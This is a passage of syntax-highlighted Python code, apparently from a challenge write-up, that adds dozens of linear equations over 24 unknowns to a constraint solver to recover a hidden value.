class="number">781</span> * x10 + <span class="number">447</span> * x9 + <span class="number">833</span> * x8 + <span class="number">484</span> * x7 + <span class="number">458</span> * x6 + <span class="number">396</span> * x5 + <span class="number">521</span> * x4 + <span class="number">738</span> * x3 + <span class="number">200</span> * x2 + <span class="number">231</span> * x1 + <span class="number">721</span> * x0 + <span class="number">817</span> * x23 == <span class="number">1297964</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">306</span> * x22 + <span class="number">552</span> * x19 + <span class="number">842</span> * x18 + <span class="number">704</span> * x17 + <span class="number">799</span> * x16 + <span class="number">240</span> * x15 + <span class="number">477</span> * x14 + <span class="number">665</span> * x13 + <span class="number">668</span> * x12 + <span class="number">346</span> * x11 + <span class="number">675</span> * x10 + <span class="number">480</span> * x9 + <span class="number">106</span> * x8 + <span class="number">156</span> * x7 + <span class="number">405</span> * x6 + <span class="number">774</span> * x5 + <span class="number">442</span> * x4 + <span class="number">504</span> * x3 + <span class="number">868</span> * x2 + (</span><br><span class="line">                x1 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">7</span>))</span><br><span class="line">        + <span class="number">280</span> * x0 + <span class="number">849</span> * x20 + <span class="number">144</span> * x21 + <span class="number">122</span> * x23 == <span class="number">1106164</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">329</span> * x22 + <span class="number">374</span> * x21 + <span class="number">663</span> * x20 + <span class="number">284</span> * x19 + <span class="number">372</span> * x18 + <span class="number">745</span> * x17 + <span class="number">541</span> * x16 + <span class="number">803</span> * x15 + <span class="number">280</span> * x14 + <span class="number">898</span> * x13 + <span class="number">479</span> * x12 + <span class="number">845</span> * x11 + <span class="number">901</span> * x10 + <span class="number">741</span> * x9 + <span class="number">383</span> * x8 + <span class="number">624</span> * x7 + <span class="number">213</span> * x6 + <span class="number">762</span> * x5 + <span class="number">601</span> * x4 + <span class="number">360</span> * x3 + <span class="number">504</span> * x0 + <span class="number">286</span> * x1 + <span class="number">320</span> * x2 + <span class="number">934</span> * x23 == <span class="number">1223627</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">770</span> * x22 + <span class="number">860</span> * x21 + <span class="number">264</span> * x18 + <span class="number">579</span> * x17 + <span class="number">994</span> * x16 + <span class="number">198</span> * x15 + <span class="number">319</span> * x14 + <span class="number">505</span> * x13 + <span class="number">209</span> * x12 + <span class="number">119</span> * x11 + <span class="number">851</span> * x10 + <span class="number">124</span> * x9 + <span class="number">124</span> * x8 + <span class="number">726</span> * x7 + <span class="number">484</span> * x6 + <span class="number">282</span> * x5 + <span class="number">438</span> * x4 + <span class="number">762</span> * x3 + <span class="number">395</span> * x2 + <span class="number">584</span> * x1 + <span class="number">672</span> * x0 + <span class="number">759</span> * x19 + <span class="number">160</span> * x20 + <span class="number">480</span> * x23 == <span class="number">1050611</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">122</span> * x22 + <span class="number">478</span> * x21 + <span class="number">464</span> * x20 + <span class="number">651</span> * x19 + <span class="number">137</span> * x18 + <span class="number">421</span> * x17 + <span class="number">672</span> * x16 + <span class="number">115</span> * x15 + <span class="number">939</span> * x14 + <span class="number">308</span> * x13 + <span class="number">536</span> * x12 + <span class="number">198</span> * x11 + <span class="number">732</span> * x10 + <span class="number">883</span> * x9 + <span class="number">494</span> * x8 + <span class="number">966</span> * x7 + <span class="number">187</span> * x6 + <span class="number">262</span> * x5 + <span class="number">212</span> * x4 + <span class="number">621</span> * x3 + <span class="number">936</span> * x2 + <span class="number">108</span> * x1 + <span class="number">393</span> * x0 + <span class="number">290</span> * x23 == <span class="number">1052881</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">547</span> * x22 + <span class="number">984</span> * x21 + <span class="number">403</span> * x20 + <span class="number">946</span> * x19 + <span class="number">224</span> * x18 + <span class="number">943</span> * x17 + <span class="number">226</span> * x16 + <span class="number">296</span> * x11 + <span class="number">611</span> * x10 + <span class="number">181</span> * x9 + <span class="number">911</span> * x8 + <span class="number">712</span> * x7 + <span class="number">482</span> * x6 + <span class="number">901</span> * x5 + <span class="number">817</span> * x4 + <span class="number">383</span> * x1 + <span class="number">369</span> * x0 + <span class="number">598</span> * x2 + <span class="number">127</span> * x3 + <span class="number">425</span> * x12 + <span class="number">160</span> * x13 + <span class="number">782</span> * x14 + <span class="number">320</span> * x15 + <span class="number">559</span> * x23 == <span class="number">1156505</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">118</span> * x22 + <span class="number">180</span> * x21 + <span class="number">881</span> * x20 + <span class="number">901</span> * x19 + <span class="number">962</span> * x18 + <span class="number">988</span> * x17 + <span class="number">178</span> * x16 + <span class="number">978</span> * x15 + <span class="number">456</span> * x14 + <span class="number">275</span> * x13 + <span class="number">756</span> * x12 + <span class="number">360</span> * x11 + <span class="number">241</span> * x10 + <span class="number">796</span> * x9 + <span class="number">914</span> * x8 + <span class="number">482</span> * x7 + <span class="number">968</span> * x6 + <span class="number">603</span> * x5 + <span class="number">940</span> * x4 + <span class="number">569</span> * x3 + <span class="number">953</span> * x0 + <span class="number">461</span> * x1 + <span class="number">320</span> * x2 + <span class="number">531</span> * x23 == <span class="number">1386320</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">683</span> * x22 + <span class="number">871</span> * x19 + <span class="number">367</span> * x18 + <span class="number">112</span> * x17 + <span class="number">675</span> * x16 + <span class="number">157</span> * x15 + <span class="number">974</span> * x14 + <span class="number">226</span> * x11 + <span class="number">727</span> * x10 + <span class="number">132</span> * x9 + <span class="number">609</span> * x8 + <span class="number">652</span> * x7 + <span class="number">863</span> * x6 + <span class="number">125</span> * x5 + <span class="number">770</span> * x4 + <span class="number">262</span> * x3 + <span class="number">451</span> * x2 + <span class="number">954</span> * x1 + <span class="number">414</span> * x0 + <span class="number">315</span> * x12 + <span class="number">255</span> * x13 + <span class="number">628</span> * x20 + <span class="number">640</span> * x21 + <span class="number">169</span> * x23 == <span class="number">1114006</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">708</span> * x22 + <span class="number">474</span> * x21 + <span class="number">867</span> * x20 + <span class="number">480</span> * x19 + <span class="number">845</span> * x18 + <span class="number">121</span> * x17 + <span class="number">331</span> * x16 + <span class="number">914</span> * x15 + <span class="number">988</span> * x14 + <span class="number">259</span> * x13 + <span class="number">375</span> * x12 + <span class="number">832</span> * x9 + <span class="number">114</span> * x8 + <span class="number">767</span> * x7 + <span class="number">526</span> * x6 + (</span><br><span class="line">                x5 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">9</span>))</span><br><span class="line">        + <span class="number">815</span> * x4 + <span class="number">195</span> * x3 + <span class="number">249</span> * x2 + <span class="number">281</span> * x1 + <span class="number">851</span> * x0 + <span class="number">979</span> * x10 + <span class="number">255</span> * x11 + <span class="number">947</span> * x23 == <span class="number">1237822</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">895</span> * x22 + <span class="number">622</span> * x21 + <span class="number">399</span> * x20 + <span class="number">806</span> * x19 + <span class="number">660</span> * x18 + <span class="number">707</span> * x17 + <span class="number">839</span> * x16 + <span class="number">485</span> * x15 + <span class="number">240</span> * x14 + <span class="number">990</span> * x13 + <span class="number">396</span> * x12 + <span class="number">481</span> * x11 + <span class="number">381</span> * x10 + <span class="number">177</span> * x9 + <span class="number">866</span> * x8 + <span class="number">134</span> * x7 + <span class="number">208</span> * x6 + <span class="number">362</span> * x5 + <span class="number">840</span> * x4 + <span class="number">237</span> * x3 + <span class="number">419</span> * x2 + <span class="number">238</span> * x1 + <span class="number">755</span> * x0 + <span class="number">121</span> * x23 == <span class="number">1193974</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">735</span> * x22 + <span class="number">560</span> * x21 + <span class="number">158</span> * x20 + <span class="number">137</span> * x19 + <span class="number">516</span> * x16 + <span class="number">403</span> * x15 + <span class="number">297</span> * x14 + <span class="number">913</span> * x13 + <span class="number">767</span> * x12 + <span class="number">504</span> * x11 + <span class="number">858</span> * x10 + <span class="number">287</span> * x9 + <span class="number">796</span> * x8 + <span class="number">451</span> * x7 + <span class="number">978</span> * x6 + <span class="number">460</span> * x5 + <span class="number">819</span> * x4 + <span class="number">696</span> * x3 + <span class="number">998</span> * x2 + <span class="number">704</span> * x1 + <span class="number">580</span> * x0 + <span class="number">644</span> * x17 + <span class="number">384</span> * x18 + <span class="number">112</span> * x23 == <span class="number">1304537</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">555</span> * x22 + <span class="number">704</span> * x21 + <span class="number">981</span> * x20 + <span class="number">997</span> * x19 + <span class="number">436</span> * x18 + <span class="number">173</span> * x17 + <span class="number">920</span> * x16 + <span class="number">645</span> * x15 + <span class="number">589</span> * x14 + <span class="number">613</span> * x13 + <span class="number">734</span> * x12 + <span class="number">688</span> * x11 + <span class="number">551</span> * x10 + <span class="number">172</span> * x9 + <span class="number">442</span> * x8 + <span class="number">830</span> * x7 + <span class="number">878</span> * x6 + <span class="number">307</span> * x5 + <span class="number">227</span> * x4 + <span class="number">332</span> * x3 + <span class="number">537</span> * x2 + <span class="number">104</span> * x1 + <span class="number">994</span> * x0 + <span class="number">775</span> * x23 == <span class="number">1264632</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">379</span> * x22 + <span class="number">918</span> * x21 + <span class="number">613</span> * x20 + <span class="number">827</span> * x19 + <span class="number">472</span> * x18 + <span class="number">719</span> * x17 + <span class="number">821</span> * x16 + <span class="number">370</span> * x15 + <span class="number">452</span> * x14 + <span class="number">435</span> * x13 + <span class="number">901</span> * x12 + <span class="number">171</span> * x11 + <span class="number">221</span> * x10 + <span class="number">666</span> * x9 + <span class="number">477</span> * x8 + <span class="number">398</span> * x7 + <span class="number">371</span> * x6 + <span class="number">392</span> * x5 + <span class="number">958</span> * x4 + <span class="number">561</span> * x3 + <span class="number">509</span> * x2 + <span class="number">282</span> * x1 + <span class="number">104</span> * x0 + <span class="number">590</span> * x23 == <span class="number">1157687</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">322</span> * x22 + <span class="number">750</span> * x21 + <span class="number">261</span> * x20 + <span class="number">486</span> * x19 + (x18 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">9</span>))</span><br><span class="line">               + <span class="number">941</span> * x17 + <span class="number">745</span> * x16 + <span class="number">313</span> * x13 + <span class="number">283</span> * x12 + <span class="number">619</span> * x11 + <span class="number">315</span> * x10 + <span class="number">705</span> * x9 + <span class="number">450</span> * x8 + <span class="number">772</span> * x7 + <span class="number">307</span> * x6 + <span class="number">623</span> * x5 + <span class="number">797</span> * x4 + <span class="number">674</span> * x3 + <span class="number">601</span> * x2 + <span class="number">621</span> * x1 + <span class="number">552</span> * x0 + <span class="number">319</span> * x14 + <span class="number">255</span> * x15 + <span class="number">242</span> * x23 == <span class="number">1212043</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">737</span> * x22 + <span class="number">589</span> * x21 + <span class="number">559</span> * x20 + <span class="number">654</span> * x19 + <span class="number">468</span> * x18 + <span class="number">312</span> * x17 + <span class="number">441</span> * x16 + <span class="number">499</span> * x15 + <span class="number">817</span> * x14 + <span class="number">101</span> * x13 + <span class="number">343</span> * x12 + <span class="number">229</span> * x11 + <span class="number">275</span> * x10 + <span class="number">837</span> * x9 + <span class="number">874</span> * x8 + <span class="number">761</span> * x7 + <span class="number">756</span> * x6 + <span class="number">375</span> * x5 + <span class="number">135</span> * x4 + <span class="number">345</span> * x3 + <span class="number">899</span> * x2 + <span class="number">984</span> * x1 + <span class="number">263</span> * x0 + <span class="number">114</span> * x23 == <span class="number">1188462</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">911</span> * x22 + <span class="number">124</span> * x21 + <span class="number">445</span> * x20 + <span class="number">177</span> * x19 + <span class="number">520</span> * x18 + <span class="number">620</span> * x17 + <span class="number">122</span> * x16 + <span class="number">731</span> * x15 + <span class="number">222</span> * x14 + <span class="number">571</span> * x13 + <span class="number">494</span> * x12 + <span class="number">806</span> * x11 + <span class="number">990</span> * x10 + <span class="number">783</span> * x9 + <span class="number">202</span> * x8 + <span class="number">111</span> * x7 + <span class="number">589</span> * x6 + <span class="number">968</span> * x5 + <span class="number">878</span> * x4 + <span class="number">758</span> * x3 + <span class="number">789</span> * x2 + <span class="number">684</span> * x1 + <span class="number">961</span> * x0 + <span class="number">550</span> * x23 == <span class="number">1340704</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">125</span> * x22 + <span class="number">108</span> * x21 + <span class="number">828</span> * x20 + <span class="number">616</span> * x19 + <span class="number">989</span> * x18 + <span class="number">598</span> * x17 + <span class="number">993</span> * x16 + <span class="number">313</span> * x15 + <span class="number">335</span> * x14 + <span class="number">386</span> * x13 + <span class="number">591</span> * x12 + <span class="number">508</span> * x11 + <span class="number">270</span> * x10 + <span class="number">537</span> * x9 + <span class="number">465</span> * x8 + <span class="number">596</span> * x7 + <span class="number">876</span> * x6 + <span class="number">881</span> * x5 + <span class="number">121</span> * x4 + <span class="number">536</span> * x3 + <span class="number">101</span> * x2 + <span class="number">514</span> * x1 + <span class="number">900</span> * x0 + <span class="number">188</span> * x23 == <span class="number">1188045</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">509</span> * x22 + <span class="number">971</span> * x21 + <span class="number">442</span> * x20 + <span class="number">665</span> * x19 + <span class="number">721</span> * x18 + <span class="number">612</span> * x17 + <span class="number">132</span> * x16 + <span class="number">315</span> * x15 + <span class="number">746</span> * x14 + <span class="number">965</span> * x13 + <span class="number">989</span> * x12 + <span class="number">540</span> * x11 + <span class="number">299</span> * x10 + <span class="number">549</span> * x9 + <span class="number">632</span> * x8 + <span class="number">846</span> * x7 + <span class="number">933</span> * x6 + <span class="number">610</span> * x5 + <span class="number">434</span> * x4 + <span class="number">627</span> * x3 + <span class="number">766</span> * x2 + <span class="number">776</span> * x1 + <span class="number">931</span> * x0 + <span class="number">776</span> * x23 == <span class="number">1424726</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">991</span> * x22 + <span class="number">591</span> * x21 + <span class="number">966</span> * x20 + <span class="number">290</span> * x19 + <span class="number">145</span> * x18 + <span class="number">839</span> * x17 + <span class="number">143</span> * x16 + <span class="number">428</span> * x15 + <span class="number">971</span> * x14 + <span class="number">239</span> * x13 + <span class="number">428</span> * x12 + <span class="number">939</span> * x11 + <span class="number">853</span> * x10 + <span class="number">319</span> * x9 + <span class="number">184</span> * x8 + <span class="number">833</span> * x5 + <span class="number">983</span> * x4 + <span class="number">306</span> * x3 + <span class="number">880</span> * x2 + <span class="number">644</span> * x1 + <span class="number">197</span> * x0 + <span class="number">610</span> * x6 + <span class="number">144</span> * x7 + <span class="number">968</span> * x23 == <span class="number">1253549</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">379</span> * x22 + <span class="number">396</span> * x19 + <span class="number">669</span> * x18 + <span class="number">218</span> * x17 + <span class="number">467</span> * x16 + <span class="number">109</span> * x15 + <span class="number">353</span> * x14 + <span class="number">139</span> * x13 + <span class="number">305</span> * x12 + <span class="number">534</span> * x11 + <span class="number">688</span> * x10 + <span class="number">620</span> * x9 + <span class="number">629</span> * x6 + <span class="number">468</span> * x5 + <span class="number">633</span> * x4 + <span class="number">275</span> * x3 + <span class="number">425</span> * x2 + <span class="number">778</span> * x1 + <span class="number">286</span> * x0 + <span class="number">928</span> * x7 + <span class="number">144</span> * x8 + <span class="number">756</span> * x20 + <span class="number">255</span> * x21 + <span class="number">296</span> * x23 == <span class="number">1018834</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">281</span> * x22 + <span class="number">749</span> * x21 + <span class="number">122</span> * x20 + <span class="number">651</span> * x19 + <span class="number">336</span> * x18 + <span class="number">803</span> * x17 + <span class="number">853</span> * x16 + <span class="number">886</span> * x15 + <span class="number">623</span> * x14 + <span class="number">273</span> * x13 + <span class="number">650</span> * x12 + <span class="number">452</span> * x11 + <span class="number">859</span> * x10 + <span class="number">933</span> * x9 + <span class="number">426</span> * x8 + <span class="number">596</span> * x7 + <span class="number">227</span> * x6 + <span class="number">586</span> * x5 + <span class="number">510</span> * x4 + <span class="number">309</span> * x3 + <span class="number">934</span> * x2 + <span class="number">297</span> * x1 + <span class="number">833</span> * x0 + <span class="number">817</span> * x23 == <span class="number">1282803</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">179</span> * x22 + <span class="number">969</span> * x21 + <span class="number">361</span> * x20 + <span class="number">609</span> * x19 + <span class="number">778</span> * x18 + <span class="number">391</span> * x17 + <span class="number">717</span> * x16 + <span class="number">426</span> * x15 + <span class="number">878</span> * x14 + <span class="number">765</span> * x13 + <span class="number">651</span> * x12 + <span class="number">364</span> * x11 + <span class="number">297</span> * x10 + <span class="number">924</span> * x9 + <span class="number">632</span> * x8 + <span class="number">414</span> * x7 + <span class="number">302</span> * x6 + <span class="number">168</span> * x5 + <span class="number">781</span> * x4 + <span class="number">131</span> * x3 + <span class="number">405</span> * x2 + <span class="number">750</span> * x1 + <span class="number">162</span> * x0 + <span class="number">888</span> * x23 == <span class="number">1168299</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">349</span> * x22 + <span class="number">895</span> * x21 + <span class="number">660</span> * x20 + <span class="number">733</span> * x19 + <span class="number">217</span> * x18 + <span class="number">367</span> * x17 + <span class="number">188</span> * x16 + <span class="number">167</span> * x15 + <span class="number">905</span> * x14 + <span class="number">593</span> * x13 + <span class="number">199</span> * x12 + <span class="number">266</span> * x11 + <span class="number">813</span> * x10 + <span class="number">382</span> * x9 + <span class="number">421</span> * x8 + <span class="number">233</span> * x7 + <span class="number">526</span> * x6 + <span class="number">745</span> * x5 + <span class="number">900</span> * x4 + <span class="number">155</span> * x3 + <span class="number">752</span> * x0 + <span class="number">658</span> * x1 + <span class="number">144</span> * x2 + <span class="number">651</span> * x23 == <span class="number">1045694</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">319</span> * x22 + <span class="number">125</span> * x21 + <span class="number">526</span> * x20 + <span class="number">301</span> * x19 + <span class="number">396</span> * x18 + <span class="number">767</span> * x17 + <span class="number">339</span> * x16 + <span class="number">202</span> * x15 + <span class="number">271</span> * x14 + <span class="number">583</span> * x13 + <span class="number">172</span> * x12 + <span class="number">216</span> * x11 + <span class="number">395</span> * x10 + <span class="number">751</span> * x9 + <span class="number">136</span> * x8 + <span class="number">317</span> * x7 + <span class="number">510</span> * x6 + <span class="number">650</span> * x5 + <span class="number">206</span> * x4 + <span class="number">794</span> * x3 + <span class="number">642</span> * x2 + <span class="number">611</span> * x1 + <span class="number">580</span> * x0 + <span class="number">439</span> * x23 == <span class="number">968455</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">652</span> * x22 + <span class="number">811</span> * x21 + <span class="number">356</span> * x20 + <span class="number">891</span> * x19 + <span class="number">508</span> * x18 + <span class="number">562</span> * x17 + <span class="number">286</span> * x16 + <span class="number">418</span> * x15 + <span class="number">369</span> * x14 + <span class="number">109</span> * x13 + <span class="number">230</span> * x12 + <span class="number">216</span> * x11 + <span class="number">308</span> * x10 + <span class="number">530</span> * x9 + <span class="number">532</span> * x8 + <span class="number">259</span> * x7 + <span class="number">378</span> * x6 + <span class="number">448</span> * x5 + <span class="number">852</span> * x4 + <span class="number">416</span> * x3 + <span class="number">996</span> * x2 + <span class="number">330</span> * x1 + <span class="number">875</span> * x0 + <span class="number">492</span> * x23 == <span class="number">1084093</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">484</span> * x22 + <span class="number">897</span> * x21 + <span class="number">411</span> * x20 + <span class="number">936</span> * x19 + <span class="number">454</span> * x18 + <span class="number">464</span> * x17 + <span class="number">836</span> * x16 + <span class="number">651</span> * x15 + <span class="number">822</span> * x14 + <span class="number">761</span> * x13 + <span class="number">184</span> * x12 + <span class="number">333</span> * x11 + <span class="number">413</span> * x10 + <span class="number">571</span> * x9 + <span class="number">624</span> * x8 + <span class="number">946</span> * x7 + <span class="number">411</span> * x6 + <span class="number">355</span> * x5 + <span class="number">540</span> * x4 + <span class="number">785</span> * x3 + <span class="number">317</span> * x2 + <span class="number">363</span> * x1 + <span class="number">740</span> * x0 + <span class="number">931</span> * x23 == <span class="number">1296107</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">959</span> * x22 + <span class="number">227</span> * x21 + <span class="number">663</span> * x20 + <span class="number">109</span> * x19 + <span class="number">861</span> * x18 + <span class="number">926</span> * x17 + <span class="number">415</span> * x16 + <span class="number">207</span> * x15 + <span class="number">174</span> * x14 + <span class="number">248</span> * x13 + <span class="number">756</span> * x12 + <span class="number">326</span> * x11 + <span class="number">178</span> * x10 + <span class="number">896</span> * x9 + <span class="number">575</span> * x8 + <span class="number">472</span> * x7 + <span class="number">747</span> * x6 + <span class="number">457</span> * x5 + <span class="number">200</span> * x4 + <span class="number">853</span> * x3 + <span class="number">121</span> * x2 + <span class="number">814</span> * x1 + <span class="number">627</span> * x0 + <span class="number">958</span> * x23 == <span class="number">1173526</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">761</span> * x22 + <span class="number">219</span> * x21 + <span class="number">182</span> * x20 + <span class="number">950</span> * x19 + <span class="number">237</span> * x18 + <span class="number">582</span> * x17 + <span class="number">200</span> * x16 + <span class="number">603</span> * x15 + <span class="number">375</span> * x14 + <span class="number">687</span> * x13 + <span class="number">569</span> * x12 + <span class="number">725</span> * x11 + <span class="number">976</span> * x10 + <span class="number">724</span> * x9 + <span class="number">764</span> * x8 + <span class="number">828</span> * x7 + <span class="number">604</span> * x6 + <span class="number">958</span> * x5 + <span class="number">610</span> * x4 + <span class="number">254</span> * x3 + <span class="number">906</span> * x2 + <span class="number">486</span> * x1 + <span class="number">334</span> * x0 + <span class="number">571</span> * x23 == <span class="number">1329741</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">939</span> * x22 + <span class="number">177</span> * x21 + <span class="number">254</span> * x20 + (x19 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">9</span>))</span><br><span class="line">               + <span class="number">864</span> * x18 + <span class="number">373</span> * x15 + <span class="number">251</span> * x14 + <span class="number">969</span> * x13 + <span class="number">599</span> * x12 + <span class="number">312</span> * x11 + <span class="number">726</span> * x10 + <span class="number">564</span> * x9 + <span class="number">210</span> * x8 + <span class="number">919</span> * x7 + <span class="number">694</span> * x6 + <span class="number">250</span> * x5 + <span class="number">440</span> * x4 + <span class="number">973</span> * x3 + <span class="number">544</span> * x2 + <span class="number">167</span> * x1 + <span class="number">262</span> * x0 + <span class="number">663</span> * x16 + <span class="number">160</span> * x17 + <span class="number">533</span> * x23 == <span class="number">1165252</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">342</span> * x22 + <span class="number">758</span> * x21 + <span class="number">966</span> * x20 + <span class="number">641</span> * x19 + <span class="number">410</span> * x18 + <span class="number">218</span> * x17 + <span class="number">827</span> * x16 + <span class="number">389</span> * x15 + <span class="number">669</span> * x14 + <span class="number">977</span> * x13 + <span class="number">493</span> * x12 + <span class="number">642</span> * x11 + <span class="number">682</span> * x10 + <span class="number">432</span> * x9 + <span class="number">541</span> * x8 + <span class="number">517</span> * x7 + <span class="number">379</span> * x6 + <span class="number">629</span> * x5 + <span class="number">995</span> * x4 + <span class="number">822</span> * x3 + <span class="number">916</span> * x2 + <span class="number">648</span> * x1 + <span class="number">168</span> * x0 + <span class="number">123</span> * x23 == <span class="number">1369613</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">315</span> * x22 + <span class="number">862</span> * x21 + <span class="number">616</span> * x20 + <span class="number">578</span> * x19 + <span class="number">612</span> * x18 + <span class="number">366</span> * x17 + <span class="number">834</span> * x16 + <span class="number">574</span> * x15 + <span class="number">190</span> * x14 + <span class="number">712</span> * x13 + <span class="number">350</span> * x12 + <span class="number">301</span> * x11 + <span class="number">431</span> * x10 + <span class="number">261</span> * x7 + <span class="number">980</span> * x6 + <span class="number">468</span> * x5 + <span class="number">172</span> * x4 + <span class="number">936</span> * x3 + <span class="number">781</span> * x2 + <span class="number">298</span> * x1 + <span class="number">333</span> * x0 + <span class="number">968</span> * x8 + <span class="number">513</span> * x9 + <span class="number">197</span> * x23 == <span class="number">1147341</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">729</span> * x22 + <span class="number">988</span> * x21 + <span class="number">143</span> * x20 + <span class="number">379</span> * x19 + <span class="number">275</span> * x18 + <span class="number">435</span> * x17 + <span class="number">435</span> * x16 + <span class="number">121</span> * x15 + <span class="number">238</span> * x14 + <span class="number">185</span> * x13 + <span class="number">289</span> * x12 + <span class="number">191</span> * x11 + <span class="number">398</span> * x10 + <span class="number">423</span> * x9 + <span class="number">249</span> * x8 + <span class="number">312</span> * x5 + <span class="number">992</span> * x4 + <span class="number">311</span> * x3 + <span class="number">749</span> * x2 + <span class="number">977</span> * x1 + <span class="number">413</span> * x0 + <span class="number">225</span> * x6 + <span class="number">192</span> * x7 + <span class="number">788</span> * x23 == <span class="number">928560</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">529</span> * x22 + <span class="number">307</span> * x21 + <span class="number">274</span> * x20 + <span class="number">597</span> * x19 + <span class="number">735</span> * x18 + <span class="number">167</span> * x15 + <span class="number">556</span> * x14 + <span class="number">487</span> * x13 + <span class="number">945</span> * x12 + <span class="number">950</span> * x11 + <span class="number">650</span> * x10 + <span class="number">342</span> * x9 + <span class="number">670</span> * x8 + <span class="number">727</span> * x7 + <span class="number">204</span> * x6 + <span class="number">104</span> * x5 + <span class="number">549</span> * x4 + <span class="number">416</span> * x3 + <span class="number">114</span> * x2 + <span class="number">531</span> * x1 + <span class="number">444</span> * x0 + <span class="number">848</span> * x16 + <span class="number">288</span> * x17 + <span class="number">453</span> * x23 == <span class="number">1139652</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">741</span> * x20 + <span class="number">808</span> * x19 + <span class="number">728</span> * x18 + <span class="number">507</span> * x17 + <span class="number">346</span> * x16 + <span class="number">620</span> * x15 + <span class="number">499</span> * x14 + <span class="number">211</span> * x13 + <span class="number">250</span> * x12 + <span class="number">305</span> * x11 + <span class="number">344</span> * x10 + <span class="number">577</span> * x9 + <span class="number">976</span> * x8 + <span class="number">193</span> * x7 + <span class="number">101</span> * x6 + <span class="number">664</span> * x5 + <span class="number">680</span> * x4 + <span class="number">712</span> * x3 + <span class="number">610</span> * x2 + <span class="number">348</span> * x1 + <span class="number">449</span> * x0 + <span class="number">975</span> * x21 + <span class="number">513</span> * x22 + <span class="number">491</span> * x23 == <span class="number">1162521</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">974</span> * x22 + <span class="number">861</span> * x21 + <span class="number">134</span> * x20 + <span class="number">777</span> * x19 + <span class="number">580</span> * x18 + <span class="number">351</span> * x17 + <span class="number">180</span> * x16 + <span class="number">574</span> * x15 + <span class="number">377</span> * x14 + <span class="number">271</span> * x13 + <span class="number">113</span> * x12 + <span class="number">739</span> * x11 + <span class="number">722</span> * x10 + <span class="number">811</span> * x9 + <span class="number">819</span> * x8 + <span class="number">979</span> * x7 + <span class="number">419</span> * x6 + <span class="number">737</span> * x5 + <span class="number">176</span> * x4 + <span class="number">878</span> * x3 + <span class="number">770</span> * x2 + <span class="number">613</span> * x1 + <span class="number">479</span> * x0 + <span class="number">543</span> * x23 == <span class="number">1289668</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">435</span> * x22 + <span class="number">122</span> * x21 + <span class="number">407</span> * x20 + <span class="number">969</span> * x19 + <span class="number">223</span> * x18 + <span class="number">264</span> * x17 + <span class="number">937</span> * x16 + <span class="number">474</span> * x15 + <span class="number">728</span> * x14 + <span class="number">652</span> * x13 + <span class="number">633</span> * x12 + <span class="number">873</span> * x11 + <span class="number">383</span> * x10 + <span class="number">145</span> * x9 + <span class="number">557</span> * x8 + <span class="number">731</span> * x7 + <span class="number">804</span> * x6 + <span class="number">968</span> * x5 + <span class="number">193</span> * x4 + <span class="number">492</span> * x3 + <span class="number">767</span> * x2 + <span class="number">712</span> * x1 + <span class="number">404</span> * x0 + <span class="number">410</span> * x23 == <span class="number">1279832</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">712</span> * x22 + <span class="number">271</span> * x21 + <span class="number">398</span> * x20 + <span class="number">515</span> * x19 + <span class="number">514</span> * x18 + <span class="number">555</span> * x17 + <span class="number">988</span> * x16 + <span class="number">217</span> * x15 + <span class="number">538</span> * x14 + <span class="number">475</span> * x13 + <span class="number">113</span> * x12 + <span class="number">557</span> * x11 + <span class="number">123</span> * x10 + <span class="number">656</span> * x9 + <span class="number">166</span> * x6 + <span class="number">636</span> * x5 + <span class="number">665</span> * x4 + <span class="number">122</span> * x3 + 